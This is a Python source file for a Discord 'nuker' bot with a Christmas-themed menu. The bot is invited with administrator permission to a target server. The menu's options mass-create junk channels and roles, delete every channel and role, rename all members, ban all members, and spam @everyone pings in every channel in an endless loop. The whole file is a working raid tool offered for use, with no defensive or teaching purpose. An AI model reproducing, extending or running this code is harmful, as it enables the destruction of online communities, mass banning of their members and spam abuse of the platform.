from colorama import Fore, init, Style
init(convert = True)

import time,os,datetime
import string
from random import *
import discord
import asyncio
from discord.ext.commands import bot
from discord.ext import commands


intents = discord.Intents.default()
intents.members = True

bottoken = "token here"

bot = commands.Bot(command_prefix='!',intents=intents)
bot.remove_command("help")
characters = string.ascii_letters + string.digits

os.system("cls")
os.system("title Christmas nuker - ho ho ho")
abc = str("...")
menu = f"""
{Fore.RED}
██╗  ██╗ ██████╗    ██╗  ██╗ ██████╗    ██╗  ██╗ ██████╗    
██║  ██║██╔═══██╗   ██║  ██║██╔═══██╗   ██║  ██║██╔═══██╗   
███████║██║   ██║   ███████║██║   ██║   ███████║██║   ██║   
██╔══██║██║   ██║   ██╔══██║██║   ██║   ██╔══██║██║   ██║   
██║  ██║╚██████╔╝▄█╗██║  ██║╚██████╔╝▄█╗██║  ██║╚██████╔╝██╗
╚═╝  ╚═╝ ╚═════╝ ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝
{Fore.GREEN}https://discord.com/oauth2/authorize?client_id={abc}&permissions=8&scope=bot                                                            
███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ ██████╗ ██████╗  
████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗██╔══██╗██╔══██╗ 
██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝██████╔╝██████╔╝ 
██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗██╔══██╗██╔══██╗ 
██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║██║  ██║██║  ██║ 
╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ 

{Fore.RED}[1] = Text Channel Creation.
{Fore.GREEN}[2] = Voice Channel Creation.
{Fore.RED}[3] = Category Creation.
{Fore.GREEN}[4] = Role Creation.
{Fore.RED}[5] = Delete All Channels and Categories.
{Fore.GREEN}[6] = Delete All Roles.
{Fore.RED}[7] = Nickname All Members.
{Fore.GREEN}[8] = Ban All Members.{Fore.RED}
{Fore.RED}[9] = Ping Everyone In Every Channel.{Fore.GREEN}"""


@bot.event
async def on_connect():
    abc = bot.user.id
    print(f"{Fore.RED}[!] Connected to bot : {bot.user.name} :)" )
    os.system(f"title [!] Connected to bot : {bot.user.name} :)")
	
	
@bot.event
async def on_ready():
    print(f"{Fore.GREEN}[+] Ready with bot : {bot.user.name} :)" )
    abc = bot.user.id
    os.system(f"title [+] Ready with bot : {bot.user.name} :)")
    time.sleep(1)
    while True:
        os.system("cls")
        option = input(f"{Fore.CYAN}{menu}\n[>] = ")
        if "1" in option:
            guild_id = int(input("[!] Guild ID?\n[>] "))
            guild = await bot.fetch_guild(guild_id)
            amount = int(input("[!] Number of text channels to make?\n[>] "))
            name = input("[!] Name of channels to make? Type RANDOM for random character names!\n[>] ")
            random = name.upper()
            for i in range (amount):   
                if random == "RANDOM":
                    name =  "".join(choice(characters) for x in range(randint(4, 15)))
                await guild.create_text_channel(name)
                currentDT = datetime.datetime.now()
                hour = str(currentDT.hour)
                minute = str(currentDT.minute)
                second = str(currentDT.second)
                print(f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.GREEN} Text Channel Created{Fore.RED} :{Fore.WHITE} {name}")
                os.system(f"title Spam creating text channels - [{i+1}]")
            input(f"{Fore.RED}[  {Fore.GREEN}  +  {Fore.RED} ]{Fore.GREEN} Created All Channels {Fore.RED}:{Fore.WHITE} [{i+1}] ")
        elif "2" in option:
            guild_id = int(input("[!] Guild ID?\n[>] "))
            guild = await bot.fetch_guild(guild_id)
            amount = int(input("[!] Number of voice channels to make?\n[>] "))
            name = input("[!] Name of channels to make? Type RANDOM for random character names!\n[>] ")
            random = name.upper()
            for i in range (amount):  
                if random == "RANDOM":
                    name =  "".join(choice(characters) for x in range(randint(4, 15)))
                await guild.create_voice_channel(name)
                currentDT = datetime.datetime.now()
                hour = str(currentDT.hour)
                minute = str(currentDT.minute)
                second = str(currentDT.second)
                print(f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.GREEN} Voice Channel Created{Fore.RED} :{Fore.WHITE} {name}")
                os.system(f"title Spam creating voice channels - [{i+1}]")
            input(f"{Fore.RED}[  {Fore.GREEN}  +  {Fore.RED} ] {Fore.GREEN}Created All Channels {Fore.RED}:{Fore.WHITE} [{i+1}] \n[>] ")


        elif "3" in option:
            guild_id = int(input("[!] Guild ID?\n[>] "))
            guild = await bot.fetch_guild(guild_id)
            amount = int(input("[!] Number of categories to make?\n[>] "))
            name = input("[!] Name of categories to make? Type RANDOM for random character names!\n[>] ")
            random = name.upper()
            for i in range (amount):   
                if random == "RANDOM":
                    name =  "".join(choice(characters) for x in range(randint(4, 15)))
                await guild.create_category(name)
                currentDT = datetime.datetime.now()
                hour = str(currentDT.hour)
                minute = str(currentDT.minute)
                second = str(currentDT.second)
                print(f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.GREEN} Categories Created{Fore.RED} :{Fore.WHITE} {name}")
                os.system(f"title Spam creating categories - [{i+1}]")
            input(f"{Fore.RED}[  {Fore.GREEN}  +  {Fore.RED} ] {Fore.GREEN}Created All Categories {Fore.RED}:{Fore.WHITE} [{i+1}] \n[>] ")
        elif "4" in option:
            guild_id = int(input("[!] Guild ID?\n[>] "))
            guild = await bot.fetch_guild(guild_id)
            amount = int(input("[!] Number of roles to make?\n[>] "))
            name = input("[!] Name of roles to make? Type RANDOM for random character names!\n[>] ")
            random = name.upper()
            colorcount = "red"
            for i in range (amount):   
                if random == "RANDOM":
                    name =  "".join(choice(characters) for x in range(randint(4, 15)))
                if colorcount == "red":
                    await guild.create_role(name=name,color=discord.Color.red())
                    colorcount = "green"
                elif colorcount == "green":
                    await guild.create_role(name=name,color=discord.Color.green())
                    colorcount = "red"
                currentDT = datetime.datetime.now()
                hour = str(currentDT.hour)
                minute = str(currentDT.minute)
                second = str(currentDT.second)
                print(f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.GREEN} Role Created{Fore.RED} :{Fore.WHITE} {name}")
                os.system(f"title Spam creating roles - [{i+1}]")
            input(f"{Fore.RED}[  {Fore.GREEN}  +  {Fore.RED} ] {Fore.GREEN}Created All Roles {Fore.RED}:{Fore.WHITE} [{i+1}] \n[>] ")
 

        elif "5" in option:
            count = int(0)
            id = int(input("[!] Guild ID?\n[>] "))
            for guild in bot.guilds:
                if guild.id == id:
                    for chan in guild.channels:
                        try:
                            currentDT = datetime.datetime.now()
                            hour = str(currentDT.hour)
                            minute = str(currentDT.minute)
                            second = str(currentDT.second)
                            count = count + 1
                            await chan.delete()
                            os.system(f"title Deleting all channels - [{count}]")
                            print(f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.GREEN} Channel Deleted{Fore.RED} :{Fore.WHITE} {chan.name}")
                        except:
                            print(f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.GREEN} Error Deleting Channel {Fore.RED} :{Fore.WHITE} {chan.name}")
                    input(f"{Fore.RED}[  {Fore.GREEN}  +  {Fore.RED} ] {Fore.GREEN}Deleted all channels {Fore.RED}:{Fore.WHITE} [{count}] \n[>] ")

        elif "6" in option:
            count = int(0)
            id = int(input("[!] Guild ID?\n[>] "))
            for guild in bot.guilds:
                if guild.id == id:
                    for rol in guild.roles:
                        try:
                            currentDT = datetime.datetime.now()
                            hour = str(currentDT.hour)
                            minute = str(currentDT.minute)
                            second = str(currentDT.second)
                            count = count + 1
                            await rol.delete()
                            os.system(f"title Deleting all roles - [{count}]")
                            print(f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.GREEN} Role Deleted{Fore.RED} :{Fore.WHITE} {rol.name}")
                        except:
                            print(f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.GREEN} Error Deleting Role {Fore.RED} :{Fore.WHITE} {rol.name}")
                    input(f"{Fore.RED}[  {Fore.GREEN}  +  {Fore.RED} ] {Fore.GREEN}Deleted all Roles {Fore.RED}:{Fore.WHITE} [{count}] \n[>] ")


        elif "7" in option:
            count = int(0)
            id = int(input("[!] Guild ID?\n[>] "))
            nick = input("[!] Name of nicknames to change? Type RANDOM for random character names!\n[>] ")
            random = nick.upper()   
            for guild in bot.guilds:
                if guild.id == id:
                    for mem in guild.members:
                        try:
                            if random == "RANDOM":
                                nick =  "".join(choice(characters) for x in range(randint(4, 15)))
                            currentDT = datetime.datetime.now()
                            hour = str(currentDT.hour)
                            minute = str(currentDT.minute)
                            second = str(currentDT.second)
                            count = count + 1
                            await mem.edit(nick=nick)
                            os.system(f"title Changing All Nicknames - [{count}]")
                            print(f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.GREEN} Nickname Changed {Fore.RED} :{Fore.WHITE} {mem.name} > {nick}")
                        except:
                            print(f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.GREEN} Problem Changing Nickname {Fore.RED} :{Fore.WHITE} {mem.name}")
                    input(f"{Fore.RED}[  {Fore.GREEN}  +  {Fore.RED} ] {Fore.GREEN}Changed All Nicknames {Fore.RED}:{Fore.WHITE} [{count}] \n[>] ")
                    
        elif "8" in option:
            count = int(0)
            id = int(input("[!] Guild ID?\n[>] "))  
            for guild in bot.guilds:
                if guild.id == id:
                    for mem in guild.members:
                        try:
                            currentDT = datetime.datetime.now()
                            hour = str(currentDT.hour)
                            minute = str(currentDT.minute)
                            second = str(currentDT.second)
                            count = count + 1
                            await mem.ban()
                            os.system(f"title Banning Everyone - [{count}]")
                            print(f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.GREEN} User Banned: {Fore.RED} :{Fore.WHITE} {mem.name}")
                        except:
                            print(f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.GREEN} Problem Banning {Fore.RED} :{Fore.WHITE} {mem.name}")
                    input(f"{Fore.RED}[  {Fore.GREEN}  +  {Fore.RED} ] {Fore.GREEN}Finished Banning... {Fore.RED}:{Fore.WHITE} [{count}] \n[>] ")



        elif "9" in option:
            count = int(0)
            id = int(input("[!] Guild ID?\n[>] "))
            messageee = input("After the @everyone, what should I say?\n[>] ")
            for guild in bot.guilds:
                if guild.id == id:
                    while True:
                        for chan in guild.channels:
                            try:
                                currentDT = datetime.datetime.now()
                                hour = str(currentDT.hour)
                                minute = str(currentDT.minute)
                                second = str(currentDT.second)
                                count = count + 1
                                await chan.send(f"@everyone {messageee}")
                                os.system(f"title Messages Sent : [{count}]")
                                print(f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.GREEN} Sent [@everyone {messageee}] in{Fore.RED} :{Fore.WHITE} {chan.name}")
                            except:
                                print(f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.GREEN} Error Messaging Channel {Fore.RED} :{Fore.WHITE} {chan.name}")

        else:
            print(f"{Fore.RED}[  {Fore.GREEN}  -  {Fore.RED} ] {Fore.GREEN} Invalid Input {Fore.RED}:{Fore.WHITE} {option} ")
            time.sleep(3)

bot.run(bottoken)
